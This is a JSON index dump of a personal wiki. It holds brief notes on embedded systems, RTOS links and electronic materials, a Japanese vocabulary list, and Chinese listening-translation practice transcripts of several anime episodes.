Concerto系列的异构双核间通讯方式http://www.ti.com.cn/cn/lit/an/zhca522/zhca522.pdf","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式硬件","slug":"电子工程/嵌入式硬件","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式硬件/"}]},{"title":"总线技术","date":"2019-06-09T00:00:00.000Z","path":"wiki/电子工程/嵌入式硬件/总线技术/","text":"modbushttp://www.ni.com/white-paper/52134/zhs/","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式硬件","slug":"电子工程/嵌入式硬件","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式硬件/"}]},{"title":"rtos","date":"2019-06-09T00:00:00.000Z","path":"wiki/电子工程/嵌入式软件/rtos/","text":"http://www.nuttx.org/很强大 功能很全 支持设备很多CM3核编译出来30+KB 体积算不错看了一下CPU和BOARD没有分开.. https://www.riot-os.org/主要针对物联网应用 对网络支持很好支持linux下的模拟核编译出来只有5k https://bitbucket.org/dfrank/tneokernel","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式软件","slug":"电子工程/嵌入式软件","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式软件/"}]},{"title":"嵌入式程序执行框架","date":"2019-06-09T00:00:00.000Z","path":"wiki/电子工程/嵌入式软件/嵌入式程序执行框架/","text":"TODO 整理 http://blog.chinaunix.net/uid-24129635-id-113102.html 改进型时间触发系统，对不同任务的实时性进行分类：http://www.chinaaet.com/article/190227 http://bbs.ednchina.com/BLOG_ARTICLE_1899966.HTMhttp://www.openedv.com/forum.php?mod=viewthread&action=printable&tid=17579http://mark3os.com/docs/html/_s_u_p_e_r.html#SUPER0","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式软件","slug":"电子工程/嵌入式软件","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式软件/"}]},{"title":"电子相关材料materials","date":"2019-06-09T00:00:00.000Z","path":"wiki/电子工程/电子相关材料materials/","text":"醋酸布胶带醋酸布胶带采用进口优质醋酸纤维布为基材，涂以丙烯酸阻燃胶制造而成。有黑白两种颜色可提供选择使用, ,具有耐高温.耐溶剂.抗老化性佳， 绝缘性好,阻燃,黏度高等特点,具有性能稳定可靠的特点。规格：长度为30M，宽可订做。 品名：醋酸布胶带 厚度: 190um 对钢粘着力 N/2.5cm: 11 拉伸强度 N/2.5cm: 120 伸长率 %: 20 耐电压: 3.6KV 特性/用途：具有耐高温，耐溶剂，抗老化性佳，绝缘性好,阻燃,黏度高，等特点,具有性能稳定可靠等特性。广泛作为电子工业中变压器,马达, 线圈电容器及变频电源供应器等缠绕用之绝缘材料。 以上所列数据为实测数据, 非保证值, 谨供参考! 建议用户在使用前必须试用, 方可大量使用. 导电布原于由美国航空宇宙开发局(NASA)防止航空宇宙设备的错误工作为目的而开发的，如今广泛用于全产业领域，不仅对人体进行保护，而可以预防产业器具的误操作而引起的损失。 导电布导电布是由化学纤维及天然纤维等构成的织物表面上覆上(金—银—铜—镍)等金属表层所构成的金属纤维所编织而成，可赋予导电性且没有纤维固有性质以外变化，可以确保裁剪及缝制的加工性能或透气性、柔软性、舒适感。导电布在遇到电波时，则会根据其物体的性质而进行反射，吸收、透过、提供极佳的屏蔽效果。 3MVHB胶带是一种具有超强力粘性双面胶带的全丙稀酸结构,不仅可密封隔绝潮气及多数溶剂,更可长期抗紫外线及冷热循环,独特的泡绵可做为极佳的缓冲材料.不同于机械固定之点受力,VHB胶带能够平均分散受力,使用者得以使用较轻薄的材料而无材料变形、金属疲劳等问题。3MVHB胶带高贴服性胶带还具备更多的特性：服帖性高、优异的填缝效果，独特的背胶亦适用于不同表面及低温施工使用。 3M双面胶带是双面背胶于纸张，聚脂薄膜或绵纸基材上。增加胶的稳定性以便操作及使用。根据产能，您可选择徒手或使用3M上胶器操作。亦可依需求选择纸张，聚脂薄膜或其他合成的基材。将不同的胶(橡胶，矽胶或丙稀酸胶)涂布于基材的两面以粘贴不同的物质。并可选择所需的特性，高初期粘性，高剪力等。 滑环线可以360度旋转的导线 硅密封胶可用于飞线后保护飞线。 环氧树脂胶BGA封装的封胶","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"}]},{"title":"翻译中遇到的生词","date":"2019-06-09T00:00:00.000Z","path":"wiki/自然语言/日语/翻译中遇到的生词/","text":"ただでさえ 本来就…何時も 以往，平时はかなげなり 果無げなり・果敢無げなり 靠不住 虚无 短暂的 疼き うずき ムキになる 「ムキ」 （`･ω･´）ﾑｯｷｰ! 因为一些小事情，有点小生气的感觉（就是闹变扭啦）一昨日 おととい 前天しぼりとる 搾り取る 榨取パンパン 胀胀的やりまん たくさんの男とセックスしている女。やりまく 不停的做たぶらかす 誑かす 诱惑 欺骗ずるがしこい 狡賢い 奸诈みせつける 炫耀見境 みさかい 区别割を入れる 介入うろたえる 仓皇失措たどたどしい 结结巴巴的 不熟练的しおらしい 温柔絵姿 えすがた 画像 肖像淑やか しとやか中でも なかでも 尤其是はぐらかす 糊弄过去ボツ集 没采用的原稿的集合手懐ける てなずける 驯服，使就范堪える こらえる 忍受たしなみ 嗜み 兴趣撫ぜる なぜる ＝撫でる応え いらえ 回应 【ご期待にはお応えするのがレディの嗜み】如月 きさらぎ 人名啦~ 【如月みゆ】逞しい たくましい 强壮 坚强搾取 さくしゅ搾る しぼる末永い（末長い） すえながい 形容直到永远鞭撻 べんたつ 日语里有“激励すること”的意义 在中文里没有稀に まれに 少见【意思大概和たまに相近吧】生じる しょうじる 生来媒体 ばいたい 添え付け そえつけ 俯せ うつぶせ 趴着こうらぼし 甲羅干し","tags":[],"categories":[{"name":"自然语言","slug":"自然语言","permalink":"http://wiki.noodlefighter.com/categories/自然语言/"},{"name":"日语","slug":"自然语言/日语","permalink":"http://wiki.noodlefighter.com/categories/自然语言/日语/"}]},{"title":"chobits13","date":"2019-06-09T00:00:00.000Z","path":"wiki/自然语言/翻译/听译练习/chobits13/","text":"もうすぐ夏だ 俺にとって 十八回目の夏 けど ロニン？生の俺には 季節は夏とかなんだろうか 関係ない いちに勉強 二に勉強 ん・・・なかなか成績のび？ないわね す すみません こんな暗い顔しないの。大丈夫 この夏みっちり？勉強すれば 秋になる頃には必ず成果が現れてくるわ！ 本当です？ 大丈夫！ そうですよね！ 夏はてんのざん？といますもんね！俺頑張ります そうよ！、、、くん 頑張って！ はい！ ゆ ゆみじゃん どうですか この水着 今日のために買ってきたんですよ～ に 似合うよ すごく！ よっかだよね～今日は晴れて し しめず？先生 さあ～じいじゃんの着替え おわりましたよ～ 日比谷さん。。じい？ 秀樹～～秀樹～～ てっゆうか 本当にきしっまたよ 海 ろにせい？のくせに 俺 こんなところにいって いいのか？ 模試の成績Ｄの俺が 貧乏（びんぼう）暇なしの俺が それじゃ 週末 海で合いましゅうね～ ああ？ う～み～ 聞いてるでしょう～ 新保くんから へ？ み百？三日？ そう～ 勿論 お前もいこんだな？ なんでそんなるだよ 俺 そんなお金、。、 まあ～聞け 国分寺がさ～ 毎年この時 海辺の別荘だと って 俺たちも それに同行することになたんだ だから ただよ ただ（無料の意味） でも俺たちろにんせい？だぜ 海ていてる場合じゃ。。 ああ もどすわさん じいじゃんの水着 これでいいですか 私のお古？（プルサ？）なんですけど 。。？え？ 管理人さんも誘ったんだ あと 由美ちゃんだて？ みんな行くて 言ってるのに。。 本当にお前行かないのか？ ああ いいえ そうゆうわけでは。。。ははははははははｈ じい？ 夏を乗り切れのろにんせい？ 大丈夫か俺 ５：４３","tags":[],"categories":[{"name":"自然语言","slug":"自然语言","permalink":"http://wiki.noodlefighter.com/categories/自然语言/"},{"name":"翻译","slug":"自然语言/翻译","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/"},{"name":"听译练习","slug":"自然语言/翻译/听译练习","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/听译练习/"}]},{"title":"双叶杏MAD","date":"2019-06-09T00:00:00.000Z","path":"wiki/自然语言/翻译/听译练习/双叶杏mad/","text":"「い、いやだっ! 私は働かないぞっ!アイドルだろうとなんだろうと…お断りだーっ!! ……え? アイドルになれば印税で一生楽に生きていける?ほ、本当!? は、話を聞かせてもらおうじゃないか」 プロデューサー。杏、週休8日を希望しま～す 週休8日を希望しま～す 好想一周休息⑧～天 誰が呼んだ 是谁叫来的やめくれない？ 能不能给我停下来？ 飴くれるの？ 要给我糖吗？ありがと～っ！ プロデューサー！！ 谢谢你～制作人桑！！ じゃあ～～働くか～～ 那就工作吧～～ 杏はいつでも大歓迎だよ 杏无论什么时候都是很喜欢的哦！原句（プロデューサー?こんな夏休みなら杏はいつでも大歓迎だよ）这样的暑假的话，杏无论什么时候都很喜欢哦！ ねえ～ プロデューさん～ 对吧～制作人桑～ ウチで一緒に遊ばない？ 来我家一块玩？原句（ねぇ、プロデューサー。新しいゲーム買ったからウチで一緒に遊ばない？）制作人～～我买了新出的游戏哦要不要来我家一块玩？ うん～それがいいよ～ 恩！这就好！ 暑さでバテたりとか…熱中症とか?身体が心配だもん因为太热变得萎靡……还有中暑什么的，好担心你的身体啊～ ね～聴いてる？ ねえってば！ 喂～在听着吗？ 喂～～ 最近杏に冷たいよ! 最近对杏好冷淡啊！ えええ！？ 本当にｘ３ 哎哎哎！？ 真的吗？ｘ３ やった！！ 太好了！ じゃあ～夏休みね～ 那～暑假见～ 見て見て～ 快看快看 ほい～ 喂～ お祭りだよ～ 祭典哦～ ねーねー、金魚すくいとかできる？ あ?きらりのお面もほしい！ 看呀看呀～～ 捉金鱼什么的做得到吗？ 啊，きらり的面具我也想要！ プロデューサー。ありがとうね～ 制作人。谢谢啦～ うあぁ～ ゆ、夢？ 唔啊～ 是梦啊？ い、いやだっ! 私は働かないぞっ！ 不、不要！我才不要工作呢！ 週休8日を希望しま～す 好想一周休息⑧～天 果報は寝て待てって名言だよね 不是有句名言“睡着就能等来幸福”吗 それが私の生き様だ 这就是我的生存之道！ 杏に遠慮は無用だよ！ 对我客气是没有用的哟！ いつでも休んでいいからね? 要是能一直睡下去就好了呢?","tags":[],"categories":[{"name":"自然语言","slug":"自然语言","permalink":"http://wiki.noodlefighter.com/categories/自然语言/"},{"name":"翻译","slug":"自然语言/翻译","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/"},{"name":"听译练习","slug":"自然语言/翻译/听译练习","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/听译练习/"}]},{"title":"探偵オペラ5","date":"2019-06-09T00:00:00.000Z","path":"wiki/自然语言/翻译/听译练习/探偵オペラ5/","text":"01:12|今天也是坐着巴士呢01:17|不做些其他的事吗01:17| 我们是从三天起开始跟踪这个人的01:24|那一天 我和カズミ酱正好在01:27|为了的活动资金而打工01:32| 终于发完啦～01:32|アリス 你那边如何01:34|嗯？01:35|我说啊 アリス01:38|啊 还剩下那么多01:44|蛋糕店开张啦01:50|是我的姐姐开的 很好吃的哟01:54|果然 今天也 ..01:57|果然？01:59|啊 传单呢？02:01|发完了哟 爱丽丝的份一起02:05|好啦好啦02:06|于是 在看什么呢02:08|嗯．．02:10|从在这里发传单开始02:13|每天都能看到那个人啊02:16|唉？然后呢02:17|每天都在那个位置坐下来02:22|就像在监视着什么一样02:24|坐了一下 就坐着巴士走掉了 02:26|环城巴士02:27|听起来十分普通啊．．02:31|但是 但是坐上巴士离开后 还会再在这里下车哟02:36|每天都是这样02:38|从时间来看的话02:40|途中并没有下车．02:42|唉？就是说每天都只是单纯的在坐车？02:46|嗯．．02:47|还有．．那个红色的饮料02:52|那个人 总是点一样的东西02:54|然后总是只喝一口02:58|次次都是这样 我很好奇啊02:58|这的确很奇怪额03:00|啊！ 说不定那人是怪盗 03:04|利用巴士 做着坏事呢03:05|而那个饮料是…03:08|是什么的暗号！03:09|该不是那么夸张的事情吧．．03:12|谢谢惠顾03:13|啊．．03:14|谢谢啦店家03:17|啊．．03:21|走吧 爱丽丝03:23|额？03:23|跟踪啊 坐上巴士吧03:25|但．．但是．．03:27|有谜题的话 怎么能不去解决03:29|我们是侦探啊03:34|跟踪了三天 今天果然还是没有动静的样子03:39|但是也有出来送行的时候03:42|前天也出现了没能上车的状况03:45|只是心血来潮吗．．？03:47|肯定有什么秘密哟 虽然只是直觉03:51|欢迎乘坐04:00|啊 今天不 04:01|终于行动了 上吧！04:03|谢谢了04:05|不客气04:08|アリス快点啊04:11|乘车卡 卡..04:12|谢谢啦04:19|谢谢啦w04:19|好 注意安全04:23|哦?04:26|你们俩04:28|最近把我当成．．来跟踪吧？//解决不了04:37|唉？04:40|（笑）04:44|开玩笑的哦04:45|对不起．．04:49|没关系 如果是侦探学校的学生的话04:50|跟踪也是学习04:54|那个．．莫非 今天在这里下车是为了．．04:56|是啊 想让你们大吃一惊05:00|对不起05:03|我可以问一下吗05:05|为什么每天都是 坐着循环巴士来额05:07|啊啦 一上来就知道答案的话会很无聊吧05:11|你们俩是将来的名侦探哟05:14|也是呢．．／ｗ05:16|给你们一点提示吧05:19|被咖啡馆主人问了同样的事05:23|那个时候我也说了相同的话05:26|我是为了见到某个人 才坐上那辆巴士的哟05:32|唉？不是谁都没遇到吗 也没和别人说话吗05:37|提示就到这里了哦 剩下的请你们自己想想看05:40|好．．好的05:44|那个．．我想再问个问题．为什么只喝一口呢05:47|嗯．．？鸡尾酒的事吗 那不是什么谜题哟05:52|一个月前开始去的那家咖啡店哟05:58|我每次都是．点无酒精鸡尾酒 莎莉·谭宝．．．．．06:02|那个柠檬苏打调的鸡尾酒的味道 正和我口味06:08|但是某天换成用姜味汽水调制了06:12|虽然想问问店主06:17|感觉是很难问问题的人 难问出口．．06:18|＂今天想试试味道变回来了没 就喝一口吧06:22|结果发现还是没改变 便失望了＂06:25|于是每天都重复这样06:28|嗯．．这样的话 直接问就好了嘛06:33|啊．．是呢．．直接说出来就好了呢06:38|哦？？06:40|第二天 事件发生了06:43|ｋａｚｕｍｉ酱 那个 我知道了哟06:49|大妈的在巴士上相遇的人是谁06:52|ｋａｚｕｍｉ酱？06:57|情况有点奇怪啊06:58|唉？是因为咖啡馆休业吗07:03|不 不是07:04|真想见到你 真想抱抱你 好几年了07:09|和大妈说话的 记得是．．07:11|咖啡馆的主人？07:14|嗯？果然有点奇怪 我追上去了 一下就回来 等着我07:19|ｋａｚｕｍｉ酱？ 07:23|站住！07:24|啊 你是昨天的．．07:26|大妈 跟你一起的人是谁07:29|啊 这个人是 我在巴士上见到的人 07:34|一直没能搭上话的人 07:48|唉 ？ ？？07:44|我的儿子哟07:46|小的时候 因为失去了联系07:52|下定决心 慢慢找他 07:54|这样 终于重逢了07:56|要和妈妈有好多要说的话 对不起 先告辞了08:03|08:04|08:06|嗯？08:08|ｎｉｊｙｕｙｏ先生的课上学到了哟 08:13|对方报上了名字后 就能冒充那人08:18|那个ｔｕｒｉｓｕ 吧咖啡店的．．．了呢08:21|所以咖啡店的味道变了08:24|额08:26|然后现在又．．．大妈的儿子08:28|我才不会被骗呢08:30|．．．呵 真是麻烦呢 本来终于知道大妈的儿子的事情了08:39|啊？08:41|本来想手下ｈｅｂａｋａｋｕ财产的呢08:44|果然是怪盗呢 我要把你抓住！08:48|抓得到的话08:54|那就抓吧08:55|等等08:56|ｓｙｕｏｄｏｉ．．．呢09:01|啊09:05|不要09:08|啊09:09|唉09:11|ｋａｚｕｍｉ09:13|嗯09:15|．．去09:17|啊09:19|09:27|ｓａｇｉｒｅ ｎｏ ｈａｉｔｕ 的怪盗09:29|ｒａ ｒｕｒａｒｕ09:33|又是．．．09:36|是怎么样的家伙呢 ｆｅｚａｓｕｔｅ09:38|怎么样呢 ０Ａ０09:41|最近．．．．09:46|呵呵呵09:48|又解决了一个事件呢09:51|嗯09:52|话说回来09:54|那个ｂｕｓ的司机 竟然是大妈的儿子呢09:59|嗯 所以大妈才会为了乘坐那趟巴士 每天都在咖啡店等着10:06|但是 为什么每天都重复这样的事呢10:10|快点搭话的话 就不会被怪盗盯上了呢10:13|几十年没遇到过．．一定是需要心理准备的哟10:22|是吗．．大概已经做好准备了吧10:25|嗯．．一定是10:32|那个司机先生10:34|不对．．ｂｕｎａｙａｓｉｋｉ ｔｏ 10:36|是的10:37|不好意思 工作结束后 能占用些时间吗10:41|啊 看来是重要的事情呢10:47|10:53|就这样 和我们扯上关系的 有点奇怪的事件 落下了帷幕11:02|11:02|//Cast","tags":[],"categories":[{"name":"自然语言","slug":"自然语言","permalink":"http://wiki.noodlefighter.com/categories/自然语言/"},{"name":"翻译","slug":"自然语言/翻译","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/"},{"name":"听译练习","slug":"自然语言/翻译/听译练习","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/听译练习/"}]},{"title":"探偵オペラ6","date":"2019-06-09T00:00:00.000Z","path":"wiki/自然语言/翻译/听译练习/探偵オペラ6/","text":"标题：回家01:12|黄金的招财熊猫01:20|对于复活的战利品来说还算不错啦01:29|呵呵 01:30|做得不够漂亮啊01:30|我的意思是 缺少了美感01:34|是谁?01:36|ｍｏｎａｓｅrａ，女士 ／／．．01:40|竟然被阻碍啦？01:43|又是废渣死那群人吗01:46|不是 对方是传说中的怪盗01:52|十年前的事件以来 还以为已经销声匿迹了呢01:56|怪盗．．visconte02:09|果然还是想要这里闪闪发亮啊02:14|100张卡片起订 要用到那么多吗02:17|当然啦 昨天也是 刚发生了奇怪的爆炸事件02:24|话说回来 ＜ｇａｒａｄａｆａｎｄｏ＞的成员还没全部抓到吧 ／／02:30|所以我们废渣死才．．．02:32|我回来了02:32|啊．02:36|欢迎光临 ｋａｚｕｍｉ酱02:37|真让人钦佩 今天在一起学习？02:40|不 不是的 不要看02:45|嗯？ 在做着些什么吗02:48|和哥哥你没有关系哟～02:51|真是的02:54|哎呀呀 把我排除在队友之外吗02:59|小的时候 明明总是＂欧尼酱 欧尼酱＂的撒娇的03:03|欧尼酱．．03:04|噢呀 正好大家都在啊03:11|啊 莫非是03:12|对 今晚饺子宴03:15|ｋａｚｕｍｉ酱也会帮忙的吧？03:20|好！03:20|好！ 事不宜迟现在就开始准备吧03:23|好～～03:44|03:45|真好呢 ａｒｉｓｕ03:51|嗯?为什么这样说?03:47|因为啊 ａｒｉｓｕ的家人总是在一起啊03:51|家庭氛围也融洽 03:54|没有吧 今天这样的算是难得一见的了03:57|嗯．．03:59|嗯？04:00|啊啊 真是好呢04:03|シヤン君 又温柔又帅气04:06|但是 我还是挺羡慕ｋａｚｕｍｉ酱的04:10|嗯？04:11|因为啊 双亲都是侦探 好厉害啊04:15|ｋａｚｕｍｉ酱继承了侦探的血统呢04:19|嗯04:21|唉 太夸张了吧 04:26|爸爸和妈妈做侦探 是好久以前的事情了04:27|现在只是 在侦探机构干活而已04:32|一般 一般04:42|ａｒｉｓｕ04:42|嗯？04:46|我们一定要 成为侦探啊04:49|啊 嗯04:55|感谢你送我04:57|明天见05:01|05:05|我回来了05:08|啊05:10|怎么了 这么晚回来05:16|都说了 今天在ａｒｉｓｕ的家做客了05:20|这种时候要电话回家说明情况啊05:22|唉．．05:27|就算打电话回家 爸爸和妈妈也不会接嘛05:29|明明一直放手不管我 却只在这时…05:32|因为最近野蛮的怪盗事件频发 我很担心你啊05:37|没问题的 横浜有侦探 mickyHome05:45|但是．．05:46|而且 也有废渣死 05:47|废渣死？不是只是..（しようと探偵？）吗 ／／听不清05:51|既然这样的话 爸爸就把怪盗抓住啊05:54|放弃了做侦探的爸爸 没有说废渣死坏话的权力05:59|我不会像爸爸和妈妈一样 放弃做侦探06:03|绝对要成为侦探 把横滨市的怪盗全部抓住06:07|ｋａｚｕｍｉ06:11|嗯．．啊06:27|啊06:28|我们．．吗06:33|06:36|呃．．06:39|啊．06:43|ａｒｉｓｕ？唉？06:49|刚才 警察收到了犯罪预告 是怪盗visconte发出的06:53|リスコン预告 在今晚十二时 要偷走横滨纪念馆馆藏宝石 トスカの泪 07:04|在这突然的预告里有着什么秘密呢… 07:08|现场 ｍｉｋｙＨｏｍｅ已经来到了的样子07:13|ａｒｉｓｕ 看到了吧07:17|嗯我们也出动吧07:27|07:36|啊 人好多07:36|ｋａｚｕｍｉ酱07:40|怎么办 有这些警备的话 无法进到里面07:42|不能放弃啊 肯定有我们能够做到的事情07:48|嗯 但是该怎么办呢07:51|我们能做到的事．．07:57|三 二 一08:11|唉．．08:13|来啊 有我这天才美少女警察官 ａｋｅｔｕｋｏｋｏｒｏ在的话08:20|传说中的大怪盗也是 完全没有办法出手啊08:21|啊哈哈哈08:25|啊？08:29|远足止于成家08:32|钟音止于抚静08:35|粗心大意是万万不可的哟08:37|什么时候？08:39|晚安! 女士08:40|08:31|08:47|とつご！ 部队准备！ 08:50|とつご？真是的 在哪里啊！！？ 09:03|啊 在那09:10|果然 我就说逃跑路线只可能是天上啊09:14|怎么办 这样下去就给他逃走了啊09:18|那就．．09:22|ａｒｉｓｕ 借我力量09:25|啊？ 嗯09:28|只有一次机会09:34|集中09:36|唉！09:42|嗯？09:44|那就是废渣死吗 原来如此 真是好ｔｏｉｔｕ啊09:49|啊？射偏了09:52|ｋａｚｕｍｉ酱09:56|啊09:57|10:00|ｋａｚｕｍｉ酱 看那个嗯10:06|这个 トスカの泪 10:09|visconte给我们的？10:12|废渣死的诸君 刚才真是华丽的一击10:19|为了奖励你们的勇气10:22|今天的战利品就先归还了．．10:29|啊！！真是干得漂亮呢 废渣死！10:31|弄错了生气的对象吧 ｋｏｋｏｒｏ酱10:33|别叫我ｋｏｋｏｒｏ酱10:35|但是刚才的ｔｏｉｔｕ好厉害啊10:39|嗯 吓到我了10:42|说不定 废渣死能成为很厉害的侦探呢10:45|是的10:47|切10:50|我回来了10:54|你回来了10:55|亲爱的 怎么样了10:58|久违了的晚上的散步10:58|嗯．．真的十分的开心啊11:04|","tags":[],"categories":[{"name":"自然语言","slug":"自然语言","permalink":"http://wiki.noodlefighter.com/categories/自然语言/"},{"name":"翻译","slug":"自然语言/翻译","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/"},{"name":"听译练习","slug":"自然语言/翻译/听译练习","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/听译练习/"}]},{"title":"黑白小姐2","date":"2019-06-09T00:00:00.000Z","path":"wiki/自然语言/翻译/听译练习/黑白小姐2/","text":"マネオ经纪人 我想演电视剧 这个..我去给你准备一下! 啊 露酱 早上好 早上好黑白小姐 要去拍电视剧了哟 恩 露酱 我出门了 要好好的看家和扫除哟 黑白小姐虽失去了193亿元的全部财产 今天仍为偶像事业而努力着 黑白小姐 干的漂亮啊 (マネキン 卖衣服的地方展示的人偶) 演人偶演得真好 摄影中完全没有移动啊 单只是站着的话完全没有问题 不愧是人型机器人啊 那个..住在那样破旧的公寓 真的没问题吗 恩 超级偶像KIKUKO也说过 要有在逆境中奋斗的精神 我要从那个房间开始努力往前走 出现在更多人眼前 更加耀眼 那就好… 为了成为KIKUKO那样的超级偶像 今天回去之后也要努力练习签名 露酱我回来了 今天在试演的地方买了点好东西哟 锵锵~碱性~电池~ 一用干电池 但是这回买的碱性电池电力更持久哟 露酱是充电的 真羡慕呢 啊 碱性 电池 感觉十分的 有效 好舒服~ 啊 怎么了 露酱 露酱 身体不舒服么 啊 变凉了 这是…唉!? 露酱!! 露酱 一直以来十分感谢 我永远不会忘记你的! 失去了重要的家人 黑白小姐第一次感受到了名为”悲伤”的感情.","tags":[],"categories":[{"name":"自然语言","slug":"自然语言","permalink":"http://wiki.noodlefighter.com/categories/自然语言/"},{"name":"翻译","slug":"自然语言/翻译","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/"},{"name":"听译练习","slug":"自然语言/翻译/听译练习","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/听译练习/"}]},{"title":"黑白小姐3","date":"2019-06-09T00:00:00.000Z","path":"wiki/自然语言/翻译/听译练习/黑白小姐3/","text":"#03 报复 哇咔咔 I will be back!这颗浮于宇宙中奇迹般的星球回到这祖母绿色的地球几亿年没干过的人类狩猎!把大家全部杀光光DA☆ZE 黑白小姐 在看什么呢?经纪人 露酱 快看好棒 能用这样的单三电池驱动的话 到底会多舒服呢走 我们参加幼稚园运动会吧因为是经纪拼命争取到的工作 我要好好努力才行啊作为偶像 想要在更多人面前露面呐 今天也辛苦了 孩子们看到你演的服饰人偶都看呆了..咳 都很开心给你这个这是?送你一个礼物 这是作为偶像而努力过的证明哟谢谢 黄金的南孚电池会是怎样的舒服呢?啊 如触电一般 好厉害 这样的..还是第一次不习惯高级电池电电流 使黑白小姐的身体发生了异变 开始狩猎人类DA☆ZE~先从这家伙开始吧啊那 个UFO是… 哒哒! 啊~ 哈!怎么 怎么回事啊啊!! 啊?刚才是错觉吗 啊 啊拉 我刚才做了啥? 大家都不知道 是黑白小姐从外星人手里保护了地球 running my world","tags":[],"categories":[{"name":"自然语言","slug":"自然语言","permalink":"http://wiki.noodlefighter.com/categories/自然语言/"},{"name":"翻译","slug":"自然语言/翻译","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/"},{"name":"听译练习","slug":"自然语言/翻译/听译练习","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/听译练习/"}]},{"title":"黑白小姐1","date":"2019-06-09T00:00:00.000Z","path":"wiki/自然语言/翻译/听译练习/黑白小姐1/","text":"今 ゆめをみていたの またあうわ きっとあう たきのしたで（？） 刚才做了个一个梦 我们还会再见 一定会遇到 在瀑布的下面 ルーじゃん また同じ夢を見た 一体誰なのか 撸酱 我又做了同一个梦 梦里的人到底是谁呢 いつから住んでいるか どうして住んでいるか アイドルのmiss 黑白はずっとこのお城に住んでいました 没人知道她什么时候开始住在这里 为什么住在这里 偶像黑白小姐一直在这个城堡里住着 黑白様 単3電池を新しいを変えてきておきました 黑白小姐 已经换上了新的単3電池了哦 ありがとう まなちゃん 谢谢 真奈酱 ああ～俺なんてもったいない ですわ 啊啊 实在不敢当啊 あたし 橋の下に捨てられていたの 黑白様に拾ってもらだから 本当に感謝しているんです 我被抛弃在桥底下 是黑白小姐把我捡回来的 真的十分的感谢 遠慮せず 何でも申し付けて下さい！ 不用多虑 有什么需要的尽管吩咐 ふ 恩.. [插入曲] KIKUKO？ 大人気ですね KIKUKO人气真旺呢 私もアイドルになるの KIKUKOのように 目立ちたい 我想成为偶像 像KIKUKO一样引人注目 人気アイドルになって もっと まえにでたい まえに そうすれば 見つけてもらて 会えるのに 成为偶像之后 就有更多混眼熟的机会 这样的话就能被她找到 和她相遇了 まなちゃん どうやたら アイドルの仕事が来るのかしら？ 真奈酱 如何才能有偶像的工作呢? そうですね アイドルにはマネジャーが必要だと思います 让我想想…要成为偶像的话 应该要先有个经纪人啊 仕事をとってくるマネジャーです～ 会带来工作的经济人~ マネジャー？ 经纪人? 私もマネジャーになりたいです 一生懸命に働きます！ 我也想成为经纪人 努力的工作! 嬉しい ありがとう～ 我好高兴 谢谢 お礼なんでいいですよ 不用道谢的啦~ でわ まなちゃんマネジャー 仕事をとってきて 那么 真奈酱经纪人 快给我分配工作吧 はい まずは 私に193億円をあ付けてください 首先 先给我193亿元吧. まなちゃんは193億円を持って姿を消しました それは黑白のほば全財産だだので 真奈酱拿到193亿元之后就消失了 那是黑白的全部财产 お城は差し押さえられ 彼女は追い出されてしまったんです 由于城堡被抵押了 最终她被赶出了城堡 困ったな ルーじゃん 私これからどうやて アイドルとして活動したらいいのか 麻烦大了呢 撸酱 今后我要如何从事偶像的工作呢? あ 啊 あ 啊 こめん 怪我はない 对不起 没受伤吧? 大丈夫 あっ マネジャー 不要紧 啊 经纪人? 「アイドルにはマネジャーが必要だと思います。」 “对于偶像来说经济人是必要的哟” あなた マネジャーになって 你来做我的经纪人吧 ほっ はい（？） 哈? 好.. では マネジャー 仕事をとってきて 那么 经纪人 给我分配工作吧 マネオマネジャー 本部から電話です 马捏欧经理 本部来电话了 あっ はいはい 啊 好的好的 こうして 黑白はコンビニではたらくことなったんのです 就这样 黑白开始在便利店工作了 いらしゃいます 欢迎光临","tags":[],"categories":[{"name":"自然语言","slug":"自然语言","permalink":"http://wiki.noodlefighter.com/categories/自然语言/"},{"name":"翻译","slug":"自然语言/翻译","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/"},{"name":"听译练习","slug":"自然语言/翻译/听译练习","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/听译练习/"}]},{"title":"黑白小姐4","date":"2019-06-09T00:00:00.000Z","path":"wiki/自然语言/翻译/听译练习/黑白小姐4/","text":"#04 变身 盯… 阿咧 怎么了 黑白小姐? KIKUKO的粘土人 出粘土人说明偶像的人气很高 是的呢 最近人气偶像都在出粘土人呢 粘土人是人形机器人的仿造品吧 （【捩る】もじる模仿） 嘛..算是吧.. 也就是说 我出粘土人偶也是很自然的事情吧 啊 是..是这样的吗? 我..想要出自己的粘土人! 唉?这… 那..我去争取看看! 抱歉 果然人气不够高的话是不行的.. 晓得了..那么… 为了人气爆棚 努力吧!! 我要靠自己的努力 推出自己的粘土人! 嗯..嗯 就是这个气势!! 【意気】いき 气势 黑白小姐靠着自己的力量 为了造出自己的粘土人而努力 啊 不对 啊 不对 啊 不对 不对.. 然后 努力后的结果.. 成功了! 呀..不是这样的… 但是成为粘土人后的黑白小姐 在小孩子中人气爆棚了 (啊~好可爱~好棒~) (横幅: 街内ゆるキャラフェスティバル………………镇内的综合角色展示会) 于是 经营人员注意到了她的人气 粘土人.黑白小姐 